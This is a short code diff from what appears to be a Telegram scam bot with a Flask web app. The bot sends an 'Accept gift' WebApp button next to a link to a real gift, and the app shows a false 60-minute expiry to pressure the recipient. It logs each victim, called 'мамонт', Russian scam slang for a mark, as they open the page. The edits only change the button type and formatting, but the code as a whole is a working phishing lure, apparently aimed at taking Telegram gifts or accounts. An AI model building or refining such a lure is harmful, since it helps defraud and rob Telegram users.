@@ -155,7 +155,7 @@ async def inline_handler(event):
             ),
             buttons=[
                 # Исправлено: использование Button.web_app для корректного отображения в инлайне
-                [Button.web_app("Принять подарок 🎁", web_url)],
+                [types.InlineKeyboardButtonWebApp("Принять подарок 🎁", web_url)],
                 # Кнопка ведет именно на оригинальную ссылку подарка
                 [Button.url("Посмотреть подарок", input_text)]
             ]
@@ -210,14 +210,15 @@ async def redrain_callback(event):
 @app.route('/')
 def index(): 
     target = request.args.get('nft_url', 'Главная')
-    t_start = request.args.get('t')
+    t_start = request.args.get('t') # Получаем время создания кнопки
     
     # Проверка на истечение 60 минут (3600 секунд)
     if t_start:
         try:
             if int(time.time()) - int(t_start) > 3600:
                 return "<h1>Ошибка: Ссылка более недействительна. Время на принятие подарка (60 минут) истекло.</h1>", 403
-        except: pass
+        except: 
+            pass
 
     send_log(f"🌐 Мамонт открыл WebApp. Цель: {target}")
     return render_template('index.html')
